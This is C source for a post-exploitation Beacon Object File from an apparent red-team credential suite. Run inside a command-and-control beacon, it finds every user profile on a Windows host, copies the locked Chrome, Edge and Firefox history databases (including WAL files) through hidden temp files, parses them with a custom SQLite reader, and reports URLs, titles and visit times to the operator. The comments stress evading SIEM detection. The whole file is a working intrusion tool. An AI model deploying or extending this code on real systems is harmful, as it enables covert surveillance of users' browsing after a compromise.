/*
 * browserHistory.c — in-process browser-history searcher + displayer BOF.
 *
 * Locates Chrome / Edge / Firefox local history stores, parses them in-process
 * (hand-rolled SQLite reader, no sqlite3 link), optionally filters by a
 * case-insensitive keyword against URL/title, and prints
 *   [last-visit date] (visit_count) <url> | <title>
 * to the beacon. No off-host step, no child process (SIEM-graded OPSEC).
 *
 *   Chromium (Chrome/Edge): per profile "History" SQLite, table `urls`
 *     (url, title, visit_count, last_visit_time). last_visit_time is Chrome
 *     epoch = microseconds since 1601-01-01 (Windows FILETIME *10).
 *   Firefox: profile "places.sqlite", table `moz_places`
 *     (url, title, visit_count, last_visit_date). last_visit_date is PRTime =
 *     microseconds since 1970-01-01.
 *
 * MITRE ATT&CK: T1217 (Browser Information Discovery) / T1525 (Imphash-style
 * collection from local data stores). Reads history only — no credentials.
 *
 * Build: handled by the Creds-BOF suite Makefile ->
 *        _bin/browserHistory.{x64,x86}.o
 *
 * NOTE: this box has no Windows runtime. Build + symbol-audit only; output
 * validated on the lab. On-target-tuning surfaces are marked `TUNE:`.
 *
 * The SQLite reader (be16..sqlite_walk_table/schema_cb) is copied verbatim from
 * passwordKlepto.c — it is generic and table-agnostic. If a third consumer
 * appears, factor it into a shared #include helper.
 */
#include <windows.h>
#include <stdint.h>
#include "../_include/beacon.h"
#include "../_include/bofdefs.h"

/* ---- API decls NOT present in ../_include/bofdefs.h ------------------- */
WINBASEAPI  DWORD  WINAPI KERNEL32$GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
WINADVAPI   LONG   WINAPI ADVAPI32$RegEnumKeyW(HKEY hKey, DWORD dwIndex, LPWSTR lpName, DWORD cchName);

#define DEFAULT_LIMIT        50

/* forward decl: apply_wal (in the helpers section) needs be32, which is
 * defined later in the SQLite reader section. */
static uint32_t be32(const unsigned char *p);

/* ----------------------------------------------------------------------
 *  generic helpers (libc via MSVCRT$, all from bofdefs.h)
 * -------------------------------------------------------------------- */

/* NUL-terminate up to `cap` bytes into dst (always NUL-terminated). For safe
 * BeaconPrintf with plain %s (LESSONS U4: no precision). */
static void cstrncpy(char *dst, const char *src, int n, int cap) {
    int i, m = (n < cap - 1) ? n : cap - 1;
    for (i = 0; i < m; i++) dst[i] = src[i];
    dst[m] = 0;
}

/* copy a file (which may be locked by a running browser) into memory. Opens
 * with full share flags so Chrome's History / Firefox's places.sqlite can be
 * read while the browser runs; returns a heap buffer the caller intFree()s. */
static char *ReadFileViaTemp(const char *srcPath, DWORD *size) {
    char tmpDir[MAX_PATH], tmpPath[MAX_PATH];
    HANDLE hSrc = INVALID_HANDLE_VALUE, hDst = INVALID_HANDLE_VALUE;
    DWORD dwSrc = 0, dwRead = 0, dwWritten = 0;
    char *buf = NULL;
    static DWORD uniq = 0;

    if (size) *size = 0;
    if (!srcPath || !size) return NULL;

    hSrc = KERNEL32$CreateFileA(srcPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) return NULL;
    dwSrc = KERNEL32$GetFileSize(hSrc, NULL);
    if (dwSrc == INVALID_FILE_SIZE || dwSrc == 0) { KERNEL32$CloseHandle(hSrc); return NULL; }

    if (!KERNEL32$GetTempPathA(MAX_PATH, tmpDir)) { KERNEL32$CloseHandle(hSrc); return NULL; }
    MSVCRT$_snprintf(tmpPath, MAX_PATH, "%sbhi_%lu_%lu.tmp", tmpDir, (unsigned long)KERNEL32$GetTickCount(), (unsigned long)uniq++);

    hDst = KERNEL32$CreateFileA(tmpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hDst == INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(hSrc); return NULL; }

    buf = (char *)intAlloc(dwSrc);
    if (!buf) { KERNEL32$CloseHandle(hSrc); KERNEL32$CloseHandle(hDst); return NULL; }
    if (!KERNEL32$ReadFile(hSrc, buf, dwSrc, &dwRead, NULL) || dwRead != dwSrc) { intFree(buf); KERNEL32$CloseHandle(hSrc); KERNEL32$CloseHandle(hDst); return NULL; }
    KERNEL32$CloseHandle(hSrc);
    if (!KERNEL32$WriteFile(hDst, buf, dwSrc, &dwWritten, NULL) || dwWritten != dwSrc) { intFree(buf); KERNEL32$CloseHandle(hDst); return NULL; }
    KERNEL32$CloseHandle(hDst);

    *size = dwSrc;
    return buf;
}

/* Apply a SQLite WAL (<dbPath>-wal) on top of the main DB image so we see the
 * live state, not the stale pre-checkpoint main file. Chrome/Edge History and
 * Firefox places.sqlite run in WAL mode while the browser is open, so recent
 * rows live ONLY in the -wal file (the main file's table leaf can be empty ->
 * 0 rows). Returns a heap merged buffer (caller intFree) + *outLen, or just the
 * main image if no/invalid WAL. Skips checksum validation (salt-match + apply
 * in order is enough for a read-only dump; last write to each page wins). */
static unsigned char *apply_wal(unsigned char *main, DWORD mainLen, unsigned char *wal, DWORD walLen, DWORD *outLen) {
    uint32_t magic, wpageSize, salt1, salt2;
    DWORD frameSize, off, maxPage = 0, newLen;
    unsigned char *buf = NULL;
    magic = be32(wal);
    if (magic != 0x377f0682 && magic != 0x377f0683) return NULL;   /* not a WAL */
    wpageSize = be32(wal + 8);
    if (wpageSize < 512 || (wpageSize & (wpageSize - 1))) return NULL;
    salt1 = be32(wal + 16);
    salt2 = be32(wal + 20);
    frameSize = 24 + wpageSize;
    /* pass 1: highest page number among salt-matching frames (fixes buf size) */
    off = 32;
    while (off + frameSize <= walLen) {
        uint32_t pgno = be32(wal + off);
        uint32_t fs1  = be32(wal + off + 8);
        uint32_t fs2  = be32(wal + off + 12);
        if (fs1 != salt1 || fs2 != salt2) break;          /* stale frame / WAL reset */
        if (pgno > maxPage) maxPage = pgno;
        off += frameSize;
    }
    if (maxPage == 0) return NULL;
    newLen = maxPage * wpageSize;
    if (newLen < mainLen) newLen = mainLen;
    buf = (unsigned char *)intAlloc(newLen);
    if (!buf) return NULL;
    MSVCRT$memcpy(buf, main, mainLen);
    if (newLen > mainLen) MSVCRT$memset(buf + mainLen, 0, newLen - mainLen);
    /* pass 2: overlay each live page (last write wins) */
    off = 32;
    while (off + frameSize <= walLen) {
        uint32_t pgno = be32(wal + off);
        uint32_t fs1  = be32(wal + off + 8);
        uint32_t fs2  = be32(wal + off + 12);
        if (fs1 != salt1 || fs2 != salt2) break;
        if (pgno >= 1 && pgno * wpageSize <= newLen)
            MSVCRT$memcpy(buf + (pgno - 1) * wpageSize, wal + off + 24, wpageSize);
        off += frameSize;
    }
    if (outLen) *outLen = newLen;
    return buf;
}

/* read a SQLite DB file AND its -wal (if present), returning the WAL-merged
 * image. Caller intFree. */
static char *ReadDbWithWal(const char *dbPath, DWORD *outLen) {
    char walPath[MAX_PATH];
    char *main = NULL, *wal = NULL, *merged = NULL;
    DWORD mainLen = 0, walLen = 0;
    main = ReadFileViaTemp(dbPath, &mainLen);
    if (!main) { if (outLen) *outLen = 0; return NULL; }
    MSVCRT$_snprintf(walPath, sizeof(walPath), "%s-wal", dbPath);
    wal = ReadFileViaTemp(walPath, &walLen);
    if (wal && walLen >= 32) {
        DWORD mergedLen = 0;
        merged = (char *)apply_wal((unsigned char *)main, mainLen, (unsigned char *)wal, walLen, &mergedLen);
        if (merged) { intFree(main); intFree(wal); if (outLen) *outLen = mergedLen; return merged; }
    }
    if (wal) intFree(wal);
    if (outLen) *outLen = mainLen;
    return main;
}

/* format a browser timestamp to "YYYY-MM-DD HH:MM:SS" (UTC) via FileTimeToSystemTime.
 * chrome=1: `us` = microseconds since 1601-01-01 (Chrome last_visit_time).
 * chrome=0: `us` = microseconds since 1970-01-01 (Firefox PRTime / last_visit_date).
 *
 * We build a FILETIME (100-ns intervals since 1601) using only a *10 multiply
 * (gcc lowers *10 to shift+add — native on x86, no libgcc helper) and a
 * constant add — deliberately AVOIDING a 64-bit divide (us/1e6), which on x86
 * emits an unresolved ___udivdi3 libgcc call (LESSONS: no 64-bit div on x86). */
static void fmt_time(uint64_t us, int chrome, char *out, int cap) {
    ULARGE_INTEGER ul;
    FILETIME ft;
    SYSTEMTIME st;
    out[0] = 0;
    if (us == 0) return;
    if (chrome) {
        ul.QuadPart = us * 10ULL;                                  /* us(1601) -> 100ns(1601) */
    } else {
        ul.QuadPart = (us + 11644473600000000ULL) * 10ULL;         /* us(1970)+epoch -> 100ns(1601) */
    }
    ft.dwLowDateTime  = ul.LowPart;
    ft.dwHighDateTime = ul.HighPart;
    if (!KERNEL32$FileTimeToSystemTime(&ft, &st)) return;
    MSVCRT$_snprintf(out, cap, "%04u-%02u-%02u %02u:%02u:%02u",
                     st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}

/* ----------------------------------------------------------------------
 *  Minimal SQLite3 file-format reader (no sqlite3 link) — copied verbatim
 *  from passwordKlepto.c. Generic table b-tree walker + leaf-cell decoder.
 * -------------------------------------------------------------------- */
static uint16_t be16(const unsigned char *p) { return (uint16_t)((p[0] << 8) | p[1]); }
static uint32_t be32(const unsigned char *p) { return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3]; }

static int read_varint(const unsigned char *p, int rem, uint64_t *val) {
    uint64_t v = 0; int i;
    if (rem <= 0) return 0;
    for (i = 0; i < 9 && i < rem; i++) {
        unsigned char b = p[i];
        if (i < 8) { v = (v << 7) | (b & 0x7f); if (!(b & 0x80)) { *val = v; return i + 1; } }
        else { v = (v << 8) | b; *val = v; return 9; }
    }
    return 0;
}

typedef struct {
    int isText, isBlob, isInt, isNull;
    const unsigned char *ptr;
    DWORD len;
    uint64_t ival;
} Col;

typedef void (*RecCb)(Col *cols, int ncol, void *ctx);

typedef struct {
    const char *name;
    DWORD root;
    int done;
} SchemaCtx;

void schema_cb(Col *cols, int ncol, void *ctx);

typedef struct {
    unsigned char *db;
    DWORD dbLen;
    DWORD pageSize;
    DWORD reserved;
    DWORD usable;
} SQLiteDB;

static void decode_leaf_cell(SQLiteDB *s, const unsigned char *cell, DWORD cellRem, RecCb cb, void *ctx) {
    uint64_t payloadLen64, rowid;
    DWORD payloadLen, hdrBase, bodyBase, i;
    int c, cn;
    unsigned char *rec = NULL;
    DWORD recLen = 0, have = 0, localBytes = 0;
    const unsigned char *p;
    Col cols[16];
    uint64_t headerLen;
    DWORD hp, bp, hdrConsumed;

    c = read_varint(cell, (int)cellRem, &payloadLen64); if (!c) return;
    cell += c; cellRem -= c;
    c = read_varint(cell, (int)cellRem, &rowid); if (!c) return;
    cell += c; cellRem -= c;
    if (payloadLen64 > 0x1000000) return;
    payloadLen = (DWORD)payloadLen64;

    {
        DWORD U = s->usable;
        DWORD X = U - 35;
        if (payloadLen <= X) localBytes = payloadLen;
        else {
            DWORD M = ((U - 12) * 32 / 255) - 23;
            DWORD K = M + ((payloadLen - M) % (U - 4));
            localBytes = (K <= X) ? K : M;
        }
    }
    if (localBytes > cellRem) return;

    rec = (unsigned char *)intAlloc(payloadLen + 1);
    if (!rec) return;
    MSVCRT$memcpy(rec, cell, localBytes);
    have = localBytes;

    if (localBytes < payloadLen) {
        DWORD next = be32(cell + localBytes);
        while (next && have < payloadLen) {
            DWORD off = (next - 1) * s->pageSize;
            DWORD chunk;
            if (off + s->pageSize > s->dbLen) break;
            p = s->db + off;
            next = be32(p);
            chunk = s->usable - 4;
            if (chunk > payloadLen - have) chunk = payloadLen - have;
            MSVCRT$memcpy(rec + have, p + 4, chunk);
            have += chunk;
        }
    }
    if (have < payloadLen) { intFree(rec); return; }
    recLen = payloadLen;
    rec[recLen] = 0;

    cn = read_varint(rec, (int)recLen, &headerLen);
    if (!cn || headerLen > recLen) { intFree(rec); return; }
    hdrConsumed = cn;
    hp = hdrConsumed;
    bp = (DWORD)headerLen;
    for (i = 0; i < 16; i++) { cols[i].isText = cols[i].isBlob = cols[i].isInt = cols[i].isNull = 0; cols[i].ptr = NULL; cols[i].len = 0; cols[i].ival = 0; }
    c = 0;
    while (hp < (DWORD)headerLen && bp <= recLen && c < 16) {
        uint64_t st;
        DWORD clen = 0;
        int cn2 = read_varint(rec + hp, (int)((DWORD)headerLen - hp), &st);
        if (!cn2) break;
        hp += cn2;
        if (st == 0) { cols[c].isNull = 1; clen = 0; }
        else if (st <= 4) { cols[c].isInt = 1; clen = (DWORD)st; }
        else if (st == 5) { cols[c].isInt = 1; clen = 6; }
        else if (st == 6 || st == 7) { cols[c].isInt = (st == 6); clen = 8; }
        else if (st == 8 || st == 9) { cols[c].isInt = 1; cols[c].ival = (st == 9); clen = 0; }
        else if (st >= 12 && (st & 1) == 0) { cols[c].isBlob = 1; clen = (DWORD)((st - 12) / 2); }
        else if (st >= 13 && (st & 1))      { cols[c].isText = 1; clen = (DWORD)((st - 13) / 2); }
        else { break; }
        if (bp + clen > recLen) break;
        cols[c].ptr = rec + bp;
        cols[c].len = clen;
        if (cols[c].isInt && clen && clen <= 8) {
            uint64_t iv = 0; DWORD k;
            for (k = 0; k < clen; k++) iv = (iv << 8) | cols[c].ptr[k];
            cols[c].ival = iv;
        }
        bp += clen;
        c++;
    }

    cb(cols, c, ctx);
    intFree(rec);
}

static void walk_table(SQLiteDB *s, DWORD pageNo, int depth, RecCb cb, void *ctx) {
    DWORD pageOff, hdrOff, cellPtrOff, ncells, i;
    unsigned char type;
    if (depth > 8 || pageNo == 0) return;
    pageOff = (pageNo - 1) * s->pageSize;
    if (pageOff + s->pageSize > s->dbLen) return;
    hdrOff = pageOff + (pageNo == 1 ? 100 : 0);
    if (hdrOff + 12 > s->dbLen) return;
    type = s->db[hdrOff];
    ncells = be16(s->db + hdrOff + 3);

    if (type == 0x05) {
        DWORD rightMost;
        cellPtrOff = hdrOff + 12;
        for (i = 0; i < ncells; i++) {
            DWORD cp, child;
            if (cellPtrOff + 2 * (i + 1) > s->dbLen) break;
            cp = be16(s->db + cellPtrOff + 2 * i);
            if (pageOff + cp + 4 > s->dbLen) continue;
            child = be32(s->db + pageOff + cp);
            walk_table(s, child, depth + 1, cb, ctx);
        }
        rightMost = be32(s->db + hdrOff + 8);
        walk_table(s, rightMost, depth + 1, cb, ctx);
    } else if (type == 0x0d) {
        cellPtrOff = hdrOff + 8;
        for (i = 0; i < ncells && i < 5000; i++) {
            DWORD cp;
            if (cellPtrOff + 2 * (i + 1) > s->dbLen) break;
            cp = be16(s->db + cellPtrOff + 2 * i);
            if (cp == 0 || pageOff + cp >= s->dbLen) continue;
            decode_leaf_cell(s, s->db + pageOff + cp, s->pageSize - cp, cb, ctx);
        }
    }
}

static int sqlite_walk_table(unsigned char *db, DWORD dbLen, const char *tableName, RecCb cb, void *ctx) {
    SQLiteDB s;
    DWORD pageSize;
    int found = 0;
    if (!db || dbLen < 100 || MSVCRT$memcmp(db, "SQLite format 3", 15) != 0) return 0;
    pageSize = be16(db + 16);
    if (pageSize == 1) pageSize = 65536;
    if (pageSize < 512 || (pageSize & (pageSize - 1))) return 0;
    s.db = db; s.dbLen = dbLen; s.pageSize = pageSize; s.reserved = db[20]; s.usable = pageSize - db[20];

    {
        SchemaCtx fc;
        fc.name = tableName; fc.root = 0; fc.done = 0;
        walk_table(&s, 1, 0, schema_cb, &fc);
        if (!fc.root) return 0;
        walk_table(&s, fc.root, 0, cb, ctx);
        found = 1;
    }
    return found;
}

void schema_cb(Col *cols, int ncol, void *ctx) {
    SchemaCtx *fc = (SchemaCtx *)ctx;
    char nm[64];
    if (fc->done || ncol < 5 || !cols[0].isText || !cols[1].isText) return;
    if (cols[0].len != 5 || MSVCRT$memcmp(cols[0].ptr, "table", 5) != 0) return;
    cstrncpy(nm, (const char *)cols[1].ptr, cols[1].len, sizeof(nm));
    if (MSVCRT$strcmp(nm, fc->name) != 0) return;
    fc->root = (DWORD)cols[3].ival;
    fc->done = 1;
}

/* ----------------------------------------------------------------------
 *  User-profile enumeration (SYSTEM-robust)
 *
 *  SHGetFolderPathA(CSIDL_LOCAL_APPDATA) under a SYSTEM beacon returns
 *  systemprofile's AppData, NOT the real user's — so browser data is never
 *  found. Instead enumerate HKLM\...\ProfileList and check EVERY user's
 *  AppData\Local (Chromium) / AppData\Roaming (Firefox). Works whether the
 *  beacon is SYSTEM (sees all users) or a user (sees its own profile).
 * -------------------------------------------------------------------- */
typedef void (*ProfCb)(const char *profileDirA, void *ctx);

static void ForEachUserProfile(ProfCb cb, void *ctx) {
    HKEY hList = NULL;
    DWORD idx = 0;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList",
            0, KEY_READ, &hList) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] cannot open ProfileList (HKLM) — won't find per-user browser data");
        return;
    }
    for (;;) {
        wchar_t sid[256]; HKEY hSid = NULL; LONG r;
        r = ADVAPI32$RegEnumKeyW(hList, idx++, sid, 256);
        if (r != 0) break;                  /* ERROR_NO_MORE_ITEMS / end */
        if (ADVAPI32$RegOpenKeyExW(hList, sid, 0, KEY_READ, &hSid) == 0) {
            wchar_t pathW[MAX_PATH], expW[MAX_PATH];
            DWORD len = sizeof(pathW), type = 0;
            if (ADVAPI32$RegQueryValueExW(hSid, L"ProfileImagePath", NULL, &type, (LPBYTE)pathW, &len) == 0 && len) {
                char profA[MAX_PATH];
                pathW[len / sizeof(wchar_t)] = 0;
                KERNEL32$ExpandEnvironmentStringsW(pathW, expW, MAX_PATH);
                KERNEL32$WideCharToMultiByte(CP_ACP, 0, expW, -1, profA, MAX_PATH, NULL, NULL);
                cb(profA, ctx);
            }
            ADVAPI32$RegCloseKey(hSid);
        }
    }
    ADVAPI32$RegCloseKey(hList);
}

/* ----------------------------------------------------------------------
 *  History processing
 * -------------------------------------------------------------------- */
#define HMODE_CHROMIUM 0   /* table `urls`:     url=1 title=2 visits=3 hidden=6 last=5 */
#define HMODE_FIREFOX  1   /* table `moz_places`: url=1 title=2 visits=4 hidden=5 last=8 */

typedef struct {
    const char *browser;
    int mode;
    const char *keyword;   /* case-insensitive substring filter, or "" */
    int limit;             /* max rows to print (0 = DEFAULT_LIMIT) */
    int printed;
    int scanned;
    int matched;
} HistCtx;

/* per-row callback: filter by keyword, format, print. */
static void history_cb(Col *cols, int ncol, void *ctx) {
    HistCtx *cx = (HistCtx *)ctx;
    char urlbuf[1024], titlebuf[512], tbuf[32];
    const char *url = NULL, *title = NULL;
    int urlLen = 0, titleLen = 0, visitsI = 0, hiddenI = 0, lastIdx;
    uint64_t lastUs = 0;
    int hasKw;

    cx->scanned++;

    if (cx->mode == HMODE_CHROMIUM) {
        /* urls: id(0) url(1) title(2) visit_count(3) typed_count(4) last_visit_time(5) hidden(6) */
        if (ncol < 6) return;
        if (cols[1].isText) { url = (const char *)cols[1].ptr; urlLen = cols[1].len; }
        if (cols[2].isText) { title = (const char *)cols[2].ptr; titleLen = cols[2].len; }
        if (cols[3].isInt)  visitsI = (int)cols[3].ival;
        if (ncol > 6 && cols[6].isInt) hiddenI = (int)cols[6].ival;
        lastIdx = 5;
    } else {
        /* moz_places: id(0) url(1) title(2) rev_host(3) visit_count(4) hidden(5) ... last_visit_date(8) */
        if (ncol < 5) return;
        if (cols[1].isText) { url = (const char *)cols[1].ptr; urlLen = cols[1].len; }
        if (cols[2].isText) { title = (const char *)cols[2].ptr; titleLen = cols[2].len; }
        if (cols[4].isInt)  visitsI = (int)cols[4].ival;
        if (ncol > 5 && cols[5].isInt) hiddenI = (int)cols[5].ival;
        lastIdx = 8;
        /* TUNE: last_visit_date column index is 8 on modern Firefox; older
         * builds had fewer columns. Guarded by ncol check below. */
    }

    if (hiddenI) return;                          /* skip hidden (favicon/typed-hidden) rows */
    if (!url || !urlLen) return;

    if (lastIdx < ncol && cols[lastIdx].isInt) lastUs = cols[lastIdx].ival;

    cstrncpy(urlbuf, url, urlLen, sizeof(urlbuf));
    cstrncpy(titlebuf, title ? title : "", titleLen, sizeof(titlebuf));

    /* keyword filter: case-insensitive substring on url OR title */
    hasKw = cx->keyword && cx->keyword[0];
    if (hasKw) {
        if (!SHLWAPI$StrStrIA(urlbuf, cx->keyword) &&
            !SHLWAPI$StrStrIA(titlebuf, cx->keyword)) return;
    }
    cx->matched++;

    if (cx->limit > 0 && cx->printed >= cx->limit) return;   /* cap reached, stop printing */
    fmt_time(lastUs, cx->mode == HMODE_CHROMIUM ? 1 : 0, tbuf, sizeof(tbuf));
    BeaconPrintf(CALLBACK_OUTPUT, "[%s] (%d) %s | %s",
                 tbuf[0] ? tbuf : "----",
                 visitsI,
                 urlbuf,
                 titlebuf[0] ? titlebuf : "<no title>");
    cx->printed++;
}

/* ---- Chromium (Chrome / Edge) ---- */
typedef struct {
    const char *browser;
    const char *subPath;    /* "\\Google\\Chrome\\User Data" or "\\Microsoft\\Edge\\User Data" */
    HistCtx *cx;
} ChromeEnumCtx;

/* per-user callback: look for <profile>\AppData\Local<subPath>, enumerate its
 * Default / Profile * dirs, read each History. */
static void chrome_user_cb(const char *profA, void *ctx) {
    ChromeEnumCtx *e = (ChromeEnumCtx *)ctx;
    char base[MAX_PATH], searchPath[MAX_PATH], profilePath[MAX_PATH];
    WIN32_FIND_DATAA fd; HANDLE hFind;

    MSVCRT$_snprintf(base, sizeof(base), "%s\\AppData\\Local%s", profA, e->subPath);
    MSVCRT$_snprintf(searchPath, sizeof(searchPath), "%s\\*", base);
    hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;     /* this user has no such browser — skip silently */
    BeaconPrintf(CALLBACK_OUTPUT, "--- %s @ %s ---", e->browser, profA);
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == '.') continue;
        if (MSVCRT$strcmp(fd.cFileName, "Default") != 0 &&
            MSVCRT$_strnicmp(fd.cFileName, "Profile", 7) != 0) continue;

        MSVCRT$_snprintf(profilePath, sizeof(profilePath), "%s\\%s\\History", base, fd.cFileName);
        {
            DWORD sz = 0; char *db = ReadDbWithWal(profilePath, &sz);
            if (!db) continue;
            BeaconPrintf(CALLBACK_OUTPUT, "    [%s] %s (%lu bytes)", e->browser, fd.cFileName, sz);
            e->cx->printed = 0;   /* per-profile limit reset */
            if (!sqlite_walk_table((unsigned char *)db, sz, "urls", history_cb, e->cx))
                BeaconPrintf(CALLBACK_OUTPUT, "      (no `urls` table / unreadable)");
            intFree(db);
        }
    } while (KERNEL32$FindNextFileA(hFind, &fd));
    KERNEL32$FindClose(hFind);
}

static void ProcessChromiumHistory(const char *browser, const char *subPath, const char *keyword, int limit) {
    HistCtx cx;
    ChromeEnumCtx ec;
    cx.browser = browser; cx.mode = HMODE_CHROMIUM; cx.keyword = keyword;
    cx.limit = (limit > 0) ? limit : DEFAULT_LIMIT;
    cx.printed = 0; cx.scanned = 0; cx.matched = 0;
    ec.browser = browser; ec.subPath = subPath; ec.cx = &cx;

    BeaconPrintf(CALLBACK_OUTPUT, "===== %s history (keyword='%s' limit=%d) =====",
                 browser, keyword ? keyword : "", cx.limit);
    ForEachUserProfile(chrome_user_cb, &ec);
    BeaconPrintf(CALLBACK_OUTPUT, "===== %s done: %d row(s) scanned, %d matched =====", browser, cx.scanned, cx.matched);
}

/* ---- Firefox ---- */
typedef struct {
    const char *keyword;
    int limit;
    HistCtx *cx;
    int foundAny;
} FxEnumCtx;

/* read <roamingBase>\Mozilla\Firefox\profiles.ini and resolve the default
 * profile dir (under that same roamingBase). (Adapted from passwordKlepto.) */
static int FindFirefoxProfile(const char *roamingBase, char *out, int cap) {
    char ini[MAX_PATH];
    HANDLE hFile; DWORD sz = 0, rd = 0; char *buf = NULL;
    char *p, *profStart = NULL, *profEnd = NULL; DWORD plen = 0;
    int havePath = 0;

    MSVCRT$_snprintf(ini, sizeof(ini), "%s\\Mozilla\\Firefox\\profiles.ini", roamingBase);
    hFile = KERNEL32$CreateFileA(ini, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    sz = KERNEL32$GetFileSize(hFile, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { KERNEL32$CloseHandle(hFile); return 0; }
    buf = (char *)intAlloc(sz + 1);
    if (!buf) { KERNEL32$CloseHandle(hFile); return 0; }
    KERNEL32$ReadFile(hFile, buf, sz, &rd, NULL);
    KERNEL32$CloseHandle(hFile);
    buf[sz] = 0;

    p = MSVCRT$strstr(buf, "Default=Profiles/");
    if (p) {
        p += MSVCRT$strlen("Default=Profiles/");
        profStart = p;
        profEnd = MSVCRT$strstr(p, ".default-release");
    }
    if (profStart && profEnd) {
        plen = (DWORD)(profEnd - profStart) + MSVCRT$strlen(".default-release");
        MSVCRT$_snprintf(out, cap, "%s\\Mozilla\\Firefox\\Profiles\\%.*s", roamingBase, (int)plen, profStart);
        havePath = 1;
    } else {
        p = MSVCRT$strstr(buf, "Path=Profiles/");
        if (p) {
            p += MSVCRT$strlen("Path=Profiles/");
            profStart = p;
            profEnd = MSVCRT$strchr(p, '\n');
            if (!profEnd) profEnd = buf + sz;
            while (profEnd > profStart && (profEnd[-1] == '\r' || profEnd[-1] == '\n' || profEnd[-1] == ' ')) profEnd--;
            plen = (DWORD)(profEnd - profStart);
            MSVCRT$_snprintf(out, cap, "%s\\Mozilla\\Firefox\\Profiles\\%.*s", roamingBase, (int)plen, profStart);
            havePath = 1;
        }
    }
    intFree(buf);
    return havePath;
}

static void firefox_user_cb(const char *profA, void *ctx) {
    FxEnumCtx *e = (FxEnumCtx *)ctx;
    char roamingBase[MAX_PATH], profile[MAX_PATH], placesPath[MAX_PATH];
    DWORD sz = 0; char *db = NULL;

    MSVCRT$_snprintf(roamingBase, sizeof(roamingBase), "%s\\AppData\\Roaming", profA);
    if (!FindFirefoxProfile(roamingBase, profile, sizeof(profile))) return;  /* no Firefox for this user */
    e->foundAny = 1;
    BeaconPrintf(CALLBACK_OUTPUT, "--- firefox @ %s : %s ---", profA, profile);
    MSVCRT$_snprintf(placesPath, sizeof(placesPath), "%s\\places.sqlite", profile);
    db = ReadDbWithWal(placesPath, &sz);
    if (!db) { BeaconPrintf(CALLBACK_ERROR, "[!] cannot read %s", placesPath); return; }
    e->cx->printed = 0;
    if (!sqlite_walk_table((unsigned char *)db, sz, "moz_places", history_cb, e->cx))
        BeaconPrintf(CALLBACK_OUTPUT, "    (no `moz_places` table / unreadable)");
    intFree(db);
}

static void ProcessFirefoxHistory(const char *keyword, int limit) {
    HistCtx cx;
    FxEnumCtx ec;
    cx.browser = "firefox"; cx.mode = HMODE_FIREFOX; cx.keyword = keyword;
    cx.limit = (limit > 0) ? limit : DEFAULT_LIMIT;
    cx.printed = 0; cx.scanned = 0; cx.matched = 0;
    ec.keyword = keyword; ec.limit = cx.limit; ec.cx = &cx; ec.foundAny = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "===== firefox history (keyword='%s' limit=%d) =====",
                 keyword ? keyword : "", cx.limit);
    ForEachUserProfile(firefox_user_cb, &ec);
    if (!ec.foundAny) BeaconPrintf(CALLBACK_OUTPUT, "[*] firefox: no profile found on any user");
    BeaconPrintf(CALLBACK_OUTPUT, "===== firefox done: %d row(s) scanned, %d matched =====", cx.scanned, cx.matched);
}

/* ----------------------------------------------------------------------
 *  entry
 *  go() arg order: browser(cstr), keyword(cstr), limit(int)
 * -------------------------------------------------------------------- */
void go(char *args, int alen) {
    datap parser;
    char *browser, *keyword;
    int limit;
    char chromeUD[MAX_PATH], edgeUD[MAX_PATH];

    BeaconDataParse(&parser, args, alen);
    browser = BeaconDataExtract(&parser, NULL);
    keyword = BeaconDataExtract(&parser, NULL);
    limit   = BeaconDataInt(&parser);

    MSVCRT$_snprintf(chromeUD, sizeof(chromeUD), "\\Google\\Chrome\\User Data");
    MSVCRT$_snprintf(edgeUD,   sizeof(edgeUD),   "\\Microsoft\\Edge\\User Data");

    BeaconPrintf(CALLBACK_OUTPUT, "[*] browserHistory: browser='%s' keyword='%s' limit=%d",
                 browser ? browser : "(all)", keyword ? keyword : "", limit);

    if (browser && MSVCRT$strlen(browser) > 0) {
        if (MSVCRT$strcmp(browser, "firefox") == 0) { ProcessFirefoxHistory(keyword, limit); return; }
        if (MSVCRT$strcmp(browser, "chrome") == 0) { ProcessChromiumHistory("chrome", chromeUD, keyword, limit); return; }
        if (MSVCRT$strcmp(browser, "msedge") == 0) { ProcessChromiumHistory("msedge", edgeUD,   keyword, limit); return; }
        BeaconPrintf(CALLBACK_ERROR, "[!] unknown browser '%s' (use chrome|msedge|firefox)", browser);
        return;
    }

    /* no browser specified -> all three */
    ProcessChromiumHistory("chrome", chromeUD, keyword, limit);
    ProcessChromiumHistory("msedge", edgeUD,   keyword, limit);
    ProcessFirefoxHistory(keyword, limit);
}